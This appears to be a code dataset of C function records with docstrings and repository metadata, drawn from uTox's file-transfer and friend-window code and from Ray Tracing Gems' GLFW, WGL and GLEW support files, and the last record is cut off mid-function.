{"docstring": "/* Returns file number on success, UINT32_MAX on failure. */\n", "func_signal": "uint32_t ft_send_data(Tox *tox, uint32_t friend_number, uint8_t *data, size_t size, uint8_t *name, size_t name_length)", "code": "{\n    if (!tox || !data || !name) {\n        LOG_ERR(\"FileTransfer\", \"Can't send data to friend without data\");\n        return UINT32_MAX;\n    }\n\n    LOG_INFO(\"FileTransfer\", \"Starting raw data transfer to friend %u.\" , friend_number);\n\n    // TODO send the unset avatar command.\n\n    FRIEND *f = get_friend(friend_number);\n    if (!f) {\n        LOG_ERR(\"FileTransfer\", \"Unable to get friend %u to send raw data.\", friend_number);\n        return UINT32_MAX;\n    }\n\n    if (f->ft_outgoing_active_count >= MAX_FILE_TRANSFERS) {\n        LOG_ERR(\"FileTransfer\", \"Can't send raw data too many in progress...\");\n        return UINT32_MAX;\n    }\n\n    /* While It's not ideal, we don't make sure we can alloc the FILE_TRANSFER until\n     * we get the file number from toxcore. This could happen, but I assume it'll be\n     * rare enough. Either way, it'll be noisy if it fails so here's to hoping! */\n    uint8_t hash[TOX_HASH_LENGTH];\n    tox_hash(hash, data, size); // TODO skip this if the file is HUGE!\n\n    TOX_ERR_FILE_SEND error = 0;\n    uint32_t file_number = tox_file_send(tox, friend_number, TOX_FILE_KIND_DATA, size, hash, name, name_length, &error);\n    if (error || file_number == UINT32_MAX) {\n        LOG_ERR(\"FileTransfer\", \"tox_file_send() failed error code %u\", error);\n        return UINT32_MAX;\n    };\n\n    FILE_TRANSFER *ft = make_file_transfer(friend_number, file_number);\n    if (!ft) {\n        // This is the noisy case noted above.\n        LOG_ERR(\"FileTransfer\", \"Unable to malloc to actually send data!\");\n        tox_file_control(tox, friend_number, file_number, TOX_FILE_CONTROL_CANCEL, NULL);\n        return UINT32_MAX;\n    }\n\n    ++f->ft_outgoing_active_count;\n\n    memset(ft, 0, sizeof(FILE_TRANSFER));\n    ft->in_use     = true;\n\n    ft->incoming   = false;\n    ft->in_memory  = true;\n    ft->inline_img = true;\n\n    ft->name = calloc(1, name_length + 1);\n    if (!ft->name) {\n        LOG_ERR(\"FileTransfer\", \"Error, couldn't allocate memory for ft->name.\");\n        --f->ft_outgoing_active_count;\n        return UINT32_MAX;\n    }\n\n    ft->name_length = name_length;\n    snprintf((char *)ft->name, name_length + 1, \"%.*s\", (int)name_length, name);\n\n    ft->friend_number = friend_number;\n    ft->file_number = file_number;\n\n    memcpy(ft->data_hash, hash, TOX_HASH_LENGTH);\n\n    ft->via.memory = data;\n    ft->target_size = size;\n    ft->status = FILE_TRANSFER_STATUS_PAUSED_THEM;\n\n\n    FILE_TRANSFER *msg = calloc(1, sizeof(FILE_TRANSFER));\n    if (!msg) {\n        LOG_ERR(\"FileTransfer\", \"Unable to malloc for internal message. (This is bad!)\");\n        return UINT32_MAX;\n    }\n\n    *msg = *ft;\n    postmessage_utox(FILE_SEND_NEW, friend_number, file_number, msg);\n    LOG_INFO(\"FileTransfer\", \"Inline image sent to friend. FT %u, Friend %u\", ft->file_number, ft->friend_number);\n\n    return file_number;\n}", "path": "uTox/src/file_transfers.c", "commit_date": "2019-04-22 00:00:00", "repo_name": "uTox/uTox", "stars": 1002, "license": "other", "language": "c", "size": 14574}
{"docstring": "/* Pause active file. */\n", "func_signal": "static void utox_pause_file(FILE_TRANSFER *file, bool us)", "code": "{\n    switch (file->status) {\n        case FILE_TRANSFER_STATUS_NONE: {\n            if (!file->incoming) {\n                // New transfers start as paused them\n                file->status = FILE_TRANSFER_STATUS_PAUSED_THEM;\n            } else {\n                LOG_TRACE(\"FileTransfer\", \"We can't pause an unaccepted file!\");\n            }\n            break;\n        }\n\n        case FILE_TRANSFER_STATUS_ACTIVE: {\n            if (us) {\n                LOG_TRACE(\"FileTransfer\", \"File now paused by us.\");\n                file->status = FILE_TRANSFER_STATUS_PAUSED_US;\n            } else {\n                LOG_TRACE(\"FileTransfer\", \"File now paused by them.\");\n                file->status = FILE_TRANSFER_STATUS_PAUSED_THEM;\n            }\n            break;\n        }\n\n        case FILE_TRANSFER_STATUS_PAUSED_US:\n        case FILE_TRANSFER_STATUS_PAUSED_BOTH:\n        case FILE_TRANSFER_STATUS_PAUSED_THEM: {\n            if (us) {\n                if (file->status == FILE_TRANSFER_STATUS_PAUSED_US) {\n                    LOG_TRACE(\"FileTransfer\", \"File already paused by us!\");\n                } else if (file->status == FILE_TRANSFER_STATUS_PAUSED_THEM) {\n                    file->status = FILE_TRANSFER_STATUS_PAUSED_BOTH;\n                    LOG_TRACE(\"FileTransfer\", \"File now paused by both!\");\n                } else if (file->status == FILE_TRANSFER_STATUS_PAUSED_BOTH) {\n                    LOG_TRACE(\"FileTransfer\", \"File already paused by both!\");\n                } else {\n                    file->status = FILE_TRANSFER_STATUS_PAUSED_US;\n                }\n            } else {\n                if (file->status == FILE_TRANSFER_STATUS_PAUSED_US) {\n                    file->status = FILE_TRANSFER_STATUS_PAUSED_BOTH;\n                    LOG_TRACE(\"FileTransfer\", \"File now paused by both!\");\n                } else if (file->status == FILE_TRANSFER_STATUS_PAUSED_THEM) {\n                    LOG_TRACE(\"FileTransfer\", \"File was already paused by them!\");\n                } else if (file->status == FILE_TRANSFER_STATUS_PAUSED_BOTH) {\n                    LOG_TRACE(\"FileTransfer\", \"File already paused by both!\");\n                } else {\n                    file->status = FILE_TRANSFER_STATUS_PAUSED_THEM;\n                }\n            }\n            break;\n        }\n\n        case FILE_TRANSFER_STATUS_BROKEN: {\n            LOG_TRACE(\"FileTransfer\", \"Can't pause a broken file;\");\n            break;\n        }\n\n        case FILE_TRANSFER_STATUS_COMPLETED: {\n            LOG_TRACE(\"FileTransfer\", \"Can't pause a completed file;\");\n            break;\n        }\n\n        case FILE_TRANSFER_STATUS_KILLED: {\n            LOG_TRACE(\"FileTransfer\", \"Can't pause a killed file;\");\n            break;\n        }\n    }\n\n    FILE_TRANSFER *msg = calloc(1, sizeof(FILE_TRANSFER));\n    if (!msg) {\n        LOG_ERR(\"FileTransfer\", \"Unable to malloc for internal message. (This is bad!)\");\n        return;\n    }\n\n    *msg = *file;\n    postmessage_utox(FILE_STATUS_UPDATE, file->status, 0, msg);\n    // TODO free not freed data.\n}", "path": "uTox/src/file_transfers.c", "commit_date": "2019-04-22 00:00:00", "repo_name": "uTox/uTox", "stars": 1002, "license": "other", "language": "c", "size": 14574}
{"docstring": "/* Local command callback to change a file status. */\n", "func_signal": "void ft_local_control(Tox *tox, uint32_t friend_number, uint32_t file_number, TOX_FILE_CONTROL control)", "code": "{\n    FILE_TRANSFER *info  = get_file_transfer(friend_number, file_number);\n    if (!info) {\n        LOG_ERR(\"FileTransfer\", \"We know nothing of this file. This is probably an error. Friend(%u) FileNum(%u)\",\n                friend_number, file_number);\n        return;\n    }\n\n    TOX_ERR_FILE_CONTROL error = 0;\n    switch (control) {\n        case TOX_FILE_CONTROL_RESUME: {\n            if (info->status != FILE_TRANSFER_STATUS_ACTIVE) {\n                if (get_friend(friend_number)->ft_outgoing_size < MAX_FILE_TRANSFERS) {\n                    if (tox_file_control(tox, friend_number, file_number, control, &error)) {\n                        LOG_INFO(\"FileTransfer\", \"We just resumed file (%u & %u)\" , friend_number, file_number);\n                    } else {\n                        LOG_INFO(\"FileTransfer\", \"Toxcore doesn't like us! (%u & %u)\" , friend_number, file_number);\n                    }\n                } else {\n                    LOG_INFO(\"FileTransfer\", \"Can't start file, max file transfer limit reached! (%u & %u)\",\n                          friend_number, file_number);\n                }\n            } else {\n                LOG_INFO(\"FileTransfer\", \"File already active (%u & %u)\" , friend_number, file_number);\n            }\n            run_file_local(info);\n            break;\n        }\n\n        case TOX_FILE_CONTROL_PAUSE: {\n            if (info->status != FILE_TRANSFER_STATUS_PAUSED_US && info->status != FILE_TRANSFER_STATUS_PAUSED_BOTH) {\n                if (tox_file_control(tox, friend_number, file_number, control, &error)) {\n                    LOG_INFO(\"FileTransfer\", \"We just paused file (%u & %u)\" , friend_number, file_number);\n                } else {\n                    LOG_INFO(\"FileTransfer\", \"Toxcore doesn't like us! (%u & %u)\" , friend_number, file_number);\n                }\n            } else {\n                LOG_INFO(\"FileTransfer\", \"File already paused (%u & %u)\" , friend_number, file_number);\n            }\n            utox_pause_file(info, true);\n            break;\n        }\n\n        case TOX_FILE_CONTROL_CANCEL: {\n            if (info->status != FILE_TRANSFER_STATUS_KILLED) {\n                if (tox_file_control(tox, friend_number, file_number, control, &error)) {\n                    LOG_INFO(\"FileTransfer\", \"We just killed file (%u & %u)\" , friend_number, file_number);\n                } else {\n                    LOG_INFO(\"FileTransfer\", \"Toxcore doesn't like us! (%u & %u)\" , friend_number, file_number);\n                }\n            } else {\n                LOG_INFO(\"FileTransfer\", \"File already killed (%u & %u)\" , friend_number, file_number);\n            }\n            kill_file(info);\n            break;\n        }\n    }\n    /* Do something with the error! */\n    switch (error) {\n        case TOX_ERR_FILE_CONTROL_OK: {\n            // Everything's fine.\n            break;\n        }\n\n        case TOX_ERR_FILE_CONTROL_FRIEND_NOT_FOUND: {\n            LOG_ERR(\"FileTransfer\", \"Unable to send command, Friend (%u) doesn't exist!\" , info->friend_number);\n            break;\n        }\n\n        case TOX_ERR_FILE_CONTROL_FRIEND_NOT_CONNECTED: {\n            LOG_ERR(\"FileTransfer\", \"Unable to send command, Friend (%u) offline!\" , info->friend_number);\n            break;\n        }\n\n        case TOX_ERR_FILE_CONTROL_NOT_FOUND: {\n            LOG_ERR(\"FileTransfer\", \"Unable to send command, ft (%u) doesn't exist!\" , info->friend_number);\n            break;\n        }\n\n        case TOX_ERR_FILE_CONTROL_DENIED: {\n            LOG_ERR(\"FileTransfer\", \"Unable to send command, ft (%u) paused by other party.\" , info->friend_number);\n            break;\n        }\n\n        default: {\n            LOG_ERR(\"FileTransfer\", \"FileTransfer:\\tThere was an error(%u) sending the command.\"\n                        \"You probably want to see to that!\\n\", error);\n            break;\n        }\n    }\n}", "path": "uTox/src/file_transfers.c", "commit_date": "2019-04-22 00:00:00", "repo_name": "uTox/uTox", "stars": 1002, "license": "other", "language": "c", "size": 14574}
{"docstring": "/* Calculate the transfer speed for the UI. */\n", "func_signal": "static void calculate_speed(FILE_TRANSFER *file)", "code": "{\n    if (file->speed > file->num_packets * 20 * 1371) {\n        ++file->num_packets;\n        return;\n    }\n\n    file->num_packets = 0;\n\n    uint64_t time = get_time();\n    if (!file->last_check_time) {\n        file->last_check_time = time;\n        return;\n    }\n\n    // TODO replace magic number with something real. (grayhatter> I think it's cpu clock ticks)\n    if (time - file->last_check_time >= 1000 * 1000 * 100) {\n        file->speed = (((double)(file->current_size - file->last_check_transferred) * 1000.0 * 1000.0 * 1000.0)\n                       / (double)(time - file->last_check_time))\n                      + 0.5;\n        file->last_check_time        = time;\n        file->last_check_transferred = file->current_size;\n    }\n\n    FILE_TRANSFER *msg = calloc(1, sizeof(FILE_TRANSFER));\n    if (!msg) {\n        LOG_ERR(\"FileTransfer\", \"Unable to malloc for internal message. (This is bad!)\");\n        return;\n    }\n\n    *msg = *file;\n    postmessage_utox(FILE_STATUS_UPDATE, file->status, 0, msg);\n}", "path": "uTox/src/file_transfers.c", "commit_date": "2019-04-22 00:00:00", "repo_name": "uTox/uTox", "stars": 1002, "license": "other", "language": "c", "size": 14574}
{"docstring": "/* Header for friend chat window */\n", "func_signal": "static void draw_friend(int x, int y, int w, int height)", "code": "{\n    FRIEND *f = flist_get_sel_friend();\n    if (!f) {\n        LOG_ERR(\"Friend\", \"Could not get selected friend.\\n\");\n        return;\n    }\n\n    // draw avatar or default image\n    if (friend_has_avatar(f)) {\n        draw_avatar_image(f->avatar->img, x + SCALE(10), SCALE(10), f->avatar->width, f->avatar->height,\n                          BM_CONTACT_WIDTH, BM_CONTACT_WIDTH);\n    } else {\n        drawalpha(BM_CONTACT, x + SCALE(10), SCALE(10), BM_CONTACT_WIDTH, BM_CONTACT_WIDTH, COLOR_MAIN_TEXT);\n    }\n\n    setcolor(COLOR_MAIN_TEXT);\n    setfont(FONT_TITLE);\n\n    if (f->alias) {\n        drawtextrange(x + SCALE(60), settings.window_width - SCALE(128), SCALE(18), f->alias, f->alias_length);\n    } else {\n        drawtextrange(x + SCALE(60), settings.window_width - SCALE(128), SCALE(18), f->name, f->name_length);\n    }\n\n    setcolor(COLOR_MAIN_TEXT_SUBTEXT);\n    setfont(FONT_STATUS);\n    drawtextrange(x + SCALE(60), settings.window_width - SCALE(128), SCALE(32), f->status_message,\n                  f->status_length);\n\n    if (f->typing) {\n        int typing_y = ((y + height) + SCALE(CHAT_BOX_TOP - 14));\n        setfont(FONT_MISC);\n        // @TODO: separate these colors if needed\n        setcolor(COLOR_MAIN_TEXT_HINT);\n        if (f->alias) {\n            drawtextwidth_right(x, SCALE(MESSAGES_X - NAME_OFFSET), typing_y, f->alias, f->alias_length);\n        } else {\n            drawtextwidth_right(x, SCALE(MESSAGES_X - NAME_OFFSET), typing_y, f->name, f->name_length);\n        }\n        drawtextwidth(x + SCALE(MESSAGES_X), x + w, typing_y, S(IS_TYPING), SLEN(IS_TYPING));\n    }\n}", "path": "uTox/src/layout/friend.c", "commit_date": "2020-04-20 00:00:00", "repo_name": "uTox/uTox", "stars": 1002, "license": "other", "language": "c", "size": 14574}
{"docstring": "/* Draw add a friend window */\n", "func_signal": "static void draw_add_friend(int x, int UNUSED(y), int UNUSED(w), int height)", "code": "{\n    setcolor(COLOR_MAIN_TEXT);\n    setfont(FONT_SELF_NAME);\n    drawstr(x + SCALE(10), SCALE(20), ADDFRIENDS);\n\n    setcolor(COLOR_MAIN_TEXT_SUBTEXT);\n    setfont(FONT_TEXT);\n    drawstr(x + SCALE(10), SCALE(MAIN_TOP + 10), TOXID);\n\n    drawstr(x + SCALE(10), SCALE(MAIN_TOP + 58), MESSAGE);\n\n    if (!addfriend_status) {\n        return;\n    }\n\n    setfont(FONT_MISC);\n    setcolor(C_RED);\n\n    STRING *str;\n\n    switch (addfriend_status) {\n        case ADDF_SENT:\n            str = SPTR(REQ_SENT);\n            break;\n        case ADDF_BADNAME:\n            str = SPTR(REQ_INVALID_ID);\n            break;\n        case ADDF_NONAME:\n            str = SPTR(REQ_EMPTY_ID);\n            break;\n        case ADDF_TOOLONG: // if message length is too long.\n            str = SPTR(REQ_LONG_MSG);\n            break;\n        case ADDF_NOMESSAGE: // if no message (message length must be >= 1 byte).\n            str = SPTR(REQ_NO_MSG);\n            break;\n        case ADDF_OWNKEY: // if user's own key.\n            str = SPTR(REQ_SELF_ID);\n            break;\n        case ADDF_ALREADYSENT: // if friend request already sent or already a friend.\n            str = SPTR(REQ_ALREADY_FRIENDS);\n            break;\n        case ADDF_BADCHECKSUM: // if bad checksum in address.\n            str = SPTR(REQ_BAD_CHECKSUM);\n            break;\n        case ADDF_SETNEWNOSPAM: // if the friend was already there but the nospam was different.\n            str = SPTR(REQ_BAD_NOSPAM);\n            break;\n        case ADDF_NOMEM: // if increasing the friend list size fails.\n            str = SPTR(REQ_NO_MEMORY);\n            break;\n        case ADDF_NOFREQUESTSENT:\n            str = SPTR(REQ_ADDED_NO_FREQ_SENT);\n            break;\n        case ADDF_UNKNOWN: // for unknown error.\n        case ADDF_NONE:    // this case must never be rendered, but if it does, assume it's an error\n        default:\n            str = SPTR(REQ_UNKNOWN);\n            break;\n    }\n\n    utox_draw_text_multiline_within_box(x + SCALE(10), MAIN_TOP + SCALE(166),\n                                        settings.window_width - BM_SBUTTON_WIDTH - SCALE(10), 0, height,\n                                        font_small_lineheight, str->str, str->length, 0xFFFF, 0, 0, 0, 1);\n}", "path": "uTox/src/layout/friend.c", "commit_date": "2020-04-20 00:00:00", "repo_name": "uTox/uTox", "stars": 1002, "license": "other", "language": "c", "size": 14574}
{"docstring": "/* Friend has gone offline, break our outgoing transfers to this friend. */\n", "func_signal": "void ft_friend_offline(Tox *UNUSED(tox), uint32_t friend_number)", "code": "{\n    LOG_NOTE(\"FileTransfer\", \"Friend %u has gone offline, breaking transfers\" , friend_number);\n\n    FRIEND *f = get_friend(friend_number);\n    if (!f) {\n        return;\n    }\n\n    for (uint16_t i = 0; i < f->ft_outgoing_size; ++i) {\n        break_file(&f->ft_outgoing[i]);\n    }\n\n    for (uint16_t i = 0; i < f->ft_incoming_size; ++i) {\n        break_file(&f->ft_incoming[i]);\n    }\n}", "path": "uTox/src/file_transfers.c", "commit_date": "2019-04-22 00:00:00", "repo_name": "uTox/uTox", "stars": 1002, "license": "other", "language": "c", "size": 14574}
{"docstring": "/* Button to send chat message */\n", "func_signal": "static void button_chat_send_friend_on_mup(void)", "code": "{\n    // TODO clear the chat bar with a /slash command\n    e_chat_msg_onenter(&edit_chat_msg_friend);\n    // reset focus to the chat window on send to prevent segfault. May break on android.\n    edit_setfocus(&edit_chat_msg_friend);\n}", "path": "uTox/src/layout/friend.c", "commit_date": "2020-04-20 00:00:00", "repo_name": "uTox/uTox", "stars": 1002, "license": "other", "language": "c", "size": 14574}
{"docstring": "/* Remote command callback for friends to change a file status */\n", "func_signal": "static void file_transfer_callback_control(Tox *UNUSED(tox), uint32_t friend_number, uint32_t file_number,\n                                           TOX_FILE_CONTROL control, void *UNUSED(userdata))", "code": "{\n    FILE_TRANSFER *ft = get_file_transfer(friend_number, file_number);\n    if (!ft || !ft->in_use) {\n        return;\n    }\n\n    switch (control) {\n        case TOX_FILE_CONTROL_RESUME: {\n            LOG_TRACE(\"FileTransfer\", \"Friend (%i) has resumed file (%i)\" , friend_number, file_number);\n            run_file_remote(ft);\n            break;\n        }\n\n        case TOX_FILE_CONTROL_PAUSE: {\n            LOG_TRACE(\"FileTransfer\", \"Friend (%i) has paused file (%i)\" , friend_number, file_number);\n            utox_pause_file(ft, false);\n            break;\n        }\n\n        case TOX_FILE_CONTROL_CANCEL: {\n            if (ft->avatar) {\n                LOG_TRACE(\"FileTransfer\", \"Friend (%i) rejected avatar\" , friend_number);\n            } else {\n                LOG_TRACE(\"FileTransfer\", \"Friend (%i) has canceled file (%i)\" , friend_number, file_number);\n            }\n            kill_file(ft);\n            break;\n        }\n    }\n}", "path": "uTox/src/file_transfers.c", "commit_date": "2019-04-22 00:00:00", "repo_name": "uTox/uTox", "stars": 1002, "license": "other", "language": "c", "size": 14574}
{"docstring": "//========================================================================\n// Window resize callback function\n//========================================================================\n", "func_signal": "static void resize_callback(GLFWwindow* window, int width, int height)", "code": "{\n    glViewport(0, 0, width, height);\n    aspect_ratio = height ? width / (float) height : 1.f;\n}", "path": "ray-tracing-gems/Ch_29_Efficient_Particle_Volume_Splatting_in_a_Ray_Tracer/support/glfw/examples/particles.c", "commit_date": "2019-03-12 00:00:00", "repo_name": "Apress/ray-tracing-gems", "stars": 943, "license": "mit", "language": "c", "size": 140566}
{"docstring": "//========================================================================\n// Main rendering function\n//========================================================================\n", "func_signal": "static void draw_scene(GLFWwindow* window, double t)", "code": "{\n    double xpos, ypos, zpos, angle_x, angle_y, angle_z;\n    static double t_old = 0.0;\n    float dt;\n    mat4x4 projection;\n\n    // Calculate frame-to-frame delta time\n    dt = (float) (t - t_old);\n    t_old = t;\n\n    mat4x4_perspective(projection,\n                       65.f * (float) M_PI / 180.f,\n                       aspect_ratio,\n                       1.0, 60.0);\n\n    glClearColor(0.1f, 0.1f, 0.1f, 1.f);\n    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n\n    glMatrixMode(GL_PROJECTION);\n    glLoadMatrixf((const GLfloat*) projection);\n\n    // Setup camera\n    glMatrixMode(GL_MODELVIEW);\n    glLoadIdentity();\n\n    // Rotate camera\n    angle_x = 90.0 - 10.0;\n    angle_y = 10.0 * sin(0.3 * t);\n    angle_z = 10.0 * t;\n    glRotated(-angle_x, 1.0, 0.0, 0.0);\n    glRotated(-angle_y, 0.0, 1.0, 0.0);\n    glRotated(-angle_z, 0.0, 0.0, 1.0);\n\n    // Translate camera\n    xpos =  15.0 * sin((M_PI / 180.0) * angle_z) +\n             2.0 * sin((M_PI / 180.0) * 3.1 * t);\n    ypos = -15.0 * cos((M_PI / 180.0) * angle_z) +\n             2.0 * cos((M_PI / 180.0) * 2.9 * t);\n    zpos = 4.0 + 2.0 * cos((M_PI / 180.0) * 4.9 * t);\n    glTranslated(-xpos, -ypos, -zpos);\n\n    glFrontFace(GL_CCW);\n    glCullFace(GL_BACK);\n    glEnable(GL_CULL_FACE);\n\n    setup_lights();\n    glEnable(GL_LIGHTING);\n\n    glEnable(GL_FOG);\n    glFogi(GL_FOG_MODE, GL_EXP);\n    glFogf(GL_FOG_DENSITY, 0.05f);\n    glFogfv(GL_FOG_COLOR, fog_color);\n\n    draw_floor();\n\n    glEnable(GL_DEPTH_TEST);\n    glDepthFunc(GL_LEQUAL);\n    glDepthMask(GL_TRUE);\n\n    draw_fountain();\n\n    glDisable(GL_LIGHTING);\n    glDisable(GL_FOG);\n\n    // Particles must be drawn after all solid objects have been drawn\n    draw_particles(window, t, dt);\n\n    // Z-buffer not needed anymore\n    glDisable(GL_DEPTH_TEST);\n}", "path": "ray-tracing-gems/Ch_29_Efficient_Particle_Volume_Splatting_in_a_Ray_Tracer/support/glfw/examples/particles.c", "commit_date": "2019-03-12 00:00:00", "repo_name": "Apress/ray-tracing-gems", "stars": 943, "license": "mit", "language": "c", "size": 140566}
{"docstring": "//========================================================================\n// Draw floor. We build the floor recursively and let the tessellation in the\n// center (near x,y=0,0) be high, while the tessellation around the edges be\n// low.\n//========================================================================\n", "func_signal": "static void draw_floor(void)", "code": "{\n    static GLuint floor_list = 0;\n\n    if (!wireframe)\n    {\n        glEnable(GL_TEXTURE_2D);\n        glBindTexture(GL_TEXTURE_2D, floor_tex_id);\n    }\n\n    // The first time, we build the floor display list\n    if (!floor_list)\n    {\n        floor_list = glGenLists(1);\n        glNewList(floor_list, GL_COMPILE_AND_EXECUTE);\n\n        glMaterialfv(GL_FRONT, GL_DIFFUSE, floor_diffuse);\n        glMaterialfv(GL_FRONT, GL_SPECULAR, floor_specular);\n        glMaterialf(GL_FRONT, GL_SHININESS, floor_shininess);\n\n        // Draw floor as a bunch of triangle strips (high tesselation\n        // improves lighting)\n        glNormal3f(0.f, 0.f, 1.f);\n        glBegin(GL_QUADS);\n        tessellate_floor(-1.f, -1.f, 0.f, 0.f, 0);\n        tessellate_floor( 0.f, -1.f, 1.f, 0.f, 0);\n        tessellate_floor( 0.f,  0.f, 1.f, 1.f, 0);\n        tessellate_floor(-1.f,  0.f, 0.f, 1.f, 0);\n        glEnd();\n\n        glEndList();\n    }\n    else\n        glCallList(floor_list);\n\n    glDisable(GL_TEXTURE_2D);\n\n}", "path": "ray-tracing-gems/Ch_29_Efficient_Particle_Volume_Splatting_in_a_Ray_Tracer/support/glfw/examples/particles.c", "commit_date": "2019-03-12 00:00:00", "repo_name": "Apress/ray-tracing-gems", "stars": 943, "license": "mit", "language": "c", "size": 140566}
{"docstring": "// Destroy the OpenGL context\n//\n", "func_signal": "static void destroyContextWGL(_GLFWwindow* window)", "code": "{\n    if (window->context.wgl.handle)\n    {\n        wglDeleteContext(window->context.wgl.handle);\n        window->context.wgl.handle = NULL;\n    }\n}", "path": "ray-tracing-gems/Ch_29_Efficient_Particle_Volume_Splatting_in_a_Ray_Tracer/support/glfw/src/wgl_context.c", "commit_date": "2019-03-12 00:00:00", "repo_name": "Apress/ray-tracing-gems", "stars": 943, "license": "mit", "language": "c", "size": 140566}
{"docstring": "/* _WIN32 */\n", "func_signal": "GLenum GLEWAPIENTRY glewInit (void)", "code": "{\n  GLenum r;\n  r = glewContextInit();\n  if ( r != 0 ) return r;\n#if defined(_WIN32)\n  return wglewContextInit();\n#elif !defined(__ANDROID__) && !defined(__native_client__) && !defined(__HAIKU__) && (!defined(__APPLE__) || defined(GLEW_APPLE_GLX)) /* _UNIX */\n  return glxewContextInit();\n#else\n  return r;\n#endif /* _WIN32 */\n}", "path": "ray-tracing-gems/Ch_29_Efficient_Particle_Volume_Splatting_in_a_Ray_Tracer/sutil/glew.c", "commit_date": "2019-03-12 00:00:00", "repo_name": "Apress/ray-tracing-gems", "stars": 943, "license": "mit", "language": "c", "size": 140566}
{"docstring": "// Create the OpenGL or OpenGL ES context\n//\n", "func_signal": "GLFWbool _glfwCreateContextWGL(_GLFWwindow* window,\n                               const _GLFWctxconfig* ctxconfig,\n                               const _GLFWfbconfig* fbconfig)", "code": "{\n    int attribs[40];\n    int pixelFormat;\n    PIXELFORMATDESCRIPTOR pfd;\n    HGLRC share = NULL;\n\n    if (!_glfw.wgl.extensionsLoaded)\n        loadWGLExtensions();\n\n    if (ctxconfig->share)\n        share = ctxconfig->share->context.wgl.handle;\n\n    window->context.wgl.dc = GetDC(window->win32.handle);\n    if (!window->context.wgl.dc)\n    {\n        _glfwInputError(GLFW_PLATFORM_ERROR,\n                        \"WGL: Failed to retrieve DC for window\");\n        return GLFW_FALSE;\n    }\n\n    pixelFormat = choosePixelFormat(window, fbconfig);\n    if (!pixelFormat)\n        return GLFW_FALSE;\n\n    if (!DescribePixelFormat(window->context.wgl.dc,\n                             pixelFormat, sizeof(pfd), &pfd))\n    {\n        _glfwInputError(GLFW_PLATFORM_ERROR,\n                        \"WGL: Failed to retrieve PFD for selected pixel format\");\n        return GLFW_FALSE;\n    }\n\n    if (!SetPixelFormat(window->context.wgl.dc, pixelFormat, &pfd))\n    {\n        _glfwInputError(GLFW_PLATFORM_ERROR,\n                        \"WGL: Failed to set selected pixel format\");\n        return GLFW_FALSE;\n    }\n\n    if (ctxconfig->client == GLFW_OPENGL_API)\n    {\n        if (ctxconfig->forward)\n        {\n            if (!_glfw.wgl.ARB_create_context)\n            {\n                _glfwInputError(GLFW_VERSION_UNAVAILABLE,\n                                \"WGL: A forward compatible OpenGL context requested but WGL_ARB_create_context is unavailable\");\n                return GLFW_FALSE;\n            }\n        }\n\n        if (ctxconfig->profile)\n        {\n            if (!_glfw.wgl.ARB_create_context_profile)\n            {\n                _glfwInputError(GLFW_VERSION_UNAVAILABLE,\n                                \"WGL: OpenGL profile requested but WGL_ARB_create_context_profile is unavailable\");\n                return GLFW_FALSE;\n            }\n        }\n    }\n    else\n    {\n        if (!_glfw.wgl.ARB_create_context ||\n            !_glfw.wgl.ARB_create_context_profile ||\n            !_glfw.wgl.EXT_create_context_es2_profile)\n        {\n            _glfwInputError(GLFW_API_UNAVAILABLE,\n                            \"WGL: OpenGL ES requested but WGL_ARB_create_context_es2_profile is unavailable\");\n            return GLFW_FALSE;\n        }\n    }\n\n    if (_glfw.wgl.ARB_create_context)\n    {\n        int index = 0, mask = 0, flags = 0;\n\n        if (ctxconfig->client == GLFW_OPENGL_API)\n        {\n            if (ctxconfig->forward)\n                flags |= WGL_CONTEXT_FORWARD_COMPATIBLE_BIT_ARB;\n\n            if (ctxconfig->profile == GLFW_OPENGL_CORE_PROFILE)\n                mask |= WGL_CONTEXT_CORE_PROFILE_BIT_ARB;\n            else if (ctxconfig->profile == GLFW_OPENGL_COMPAT_PROFILE)\n                mask |= WGL_CONTEXT_COMPATIBILITY_PROFILE_BIT_ARB;\n        }\n        else\n            mask |= WGL_CONTEXT_ES2_PROFILE_BIT_EXT;\n\n        if (ctxconfig->debug)\n            flags |= WGL_CONTEXT_DEBUG_BIT_ARB;\n        if (ctxconfig->noerror)\n            flags |= GL_CONTEXT_FLAG_NO_ERROR_BIT_KHR;\n\n        if (ctxconfig->robustness)\n        {\n            if (_glfw.wgl.ARB_create_context_robustness)\n            {\n                if (ctxconfig->robustness == GLFW_NO_RESET_NOTIFICATION)\n                {\n                    setWGLattrib(WGL_CONTEXT_RESET_NOTIFICATION_STRATEGY_ARB,\n                                 WGL_NO_RESET_NOTIFICATION_ARB);\n                }\n                else if (ctxconfig->robustness == GLFW_LOSE_CONTEXT_ON_RESET)\n                {\n                    setWGLattrib(WGL_CONTEXT_RESET_NOTIFICATION_STRATEGY_ARB,\n                                 WGL_LOSE_CONTEXT_ON_RESET_ARB);\n                }\n\n                flags |= WGL_CONTEXT_ROBUST_ACCESS_BIT_ARB;\n            }\n        }\n\n        if (ctxconfig->release)\n        {\n            if (_glfw.wgl.ARB_context_flush_control)\n            {\n                if (ctxconfig->release == GLFW_RELEASE_BEHAVIOR_NONE)\n                {\n                    setWGLattrib(WGL_CONTEXT_RELEASE_BEHAVIOR_ARB,\n                                 WGL_CONTEXT_RELEASE_BEHAVIOR_NONE_ARB);\n                }\n                else if (ctxconfig->release == GLFW_RELEASE_BEHAVIOR_FLUSH)\n                {\n                    setWGLattrib(WGL_CONTEXT_RELEASE_BEHAVIOR_ARB,\n                                 WGL_CONTEXT_RELEASE_BEHAVIOR_FLUSH_ARB);\n                }\n            }\n        }\n\n        // NOTE: Only request an explicitly versioned context when necessary, as\n        //       explicitly requesting version 1.0 does not always return the\n        //       highest version supported by the driver\n        if (ctxconfig->major != 1 || ctxconfig->minor != 0)\n        {\n            setWGLattrib(WGL_CONTEXT_MAJOR_VERSION_ARB, ctxconfig->major);\n            setWGLattrib(WGL_CONTEXT_MINOR_VERSION_ARB, ctxconfig->minor);\n        }\n\n        if (flags)\n            setWGLattrib(WGL_CONTEXT_FLAGS_ARB, flags);\n\n        if (mask)\n            setWGLattrib(WGL_CONTEXT_PROFILE_MASK_ARB, mask);\n\n        setWGLattrib(0, 0);\n\n        window->context.wgl.handle =\n            _glfw.wgl.CreateContextAttribsARB(window->context.wgl.dc,\n                                              share, attribs);\n        if (!window->context.wgl.handle)\n        {\n            const DWORD error = GetLastError();\n\n            if (error == (0xc0070000 | ERROR_INVALID_VERSION_ARB))\n            {\n                if (ctxconfig->client == GLFW_OPENGL_API)\n                {\n                    _glfwInputError(GLFW_VERSION_UNAVAILABLE,\n                                    \"WGL: Driver does not support OpenGL version %i.%i\",\n                                    ctxconfig->major,\n                                    